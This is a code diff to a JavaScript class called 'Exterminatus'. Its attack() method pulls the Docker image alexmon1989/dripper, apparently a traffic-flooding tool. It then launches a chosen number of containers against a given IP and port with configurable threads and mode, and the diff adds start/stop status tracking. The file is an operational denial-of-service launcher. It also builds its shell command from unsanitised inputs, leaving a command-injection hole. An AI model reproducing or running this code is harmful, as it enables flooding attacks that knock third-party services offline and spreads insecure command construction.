@@ -2,21 +2,30 @@ const util = require('util');
 const { exec, spawn } = require('child_process');
 const execAsync = util.promisify(exec);
 
+const STATUS = {
+  started: 'started',
+  stopped: 'stopped'
+}
 class Exterminatus {
+  constructor() {
+    this.status = STATUS.stopped;
+  }
+
   async attack({ ip, port, mode, threads, containers }) {
     if (!containers) {
       console.error('Incorrect number of containers');
       return;
     }
     try {
-      document.dispatchEvent(new Event('START'));
       console.info('download latest image...');
       await execAsync('docker pull alexmon1989/dripper:latest');
       console.info('latest image downloaded!');
+      document.dispatchEvent(new Event('START'));
+      this.status = STATUS.started
       const queue = [];
       for (let i = containers; i !== 0; i--) {
         const name = `container${i}`;
-        const cmd = `run --rm --name ${name} alexmon1989/dripper:latest -s ${ip} -p ${port} -t ${threads} -m ${mode} && sleep 5 &`
+        const cmd = `run --rm --name ${name} alexmon1989/dripper:latest -s ${ip} -p ${port} -t ${threads} -m ${mode}`
         console.info(`preparing to run command: ${cmd}`);
         queue.push(new Promise((res) => {
           setTimeout(() => {
@@ -58,6 +67,7 @@ class Exterminatus {
       console.info(stdout);
     });
     document.dispatchEvent(new Event('STOP'));
+    this.status = STATUS.stopped;
   }
 }
 
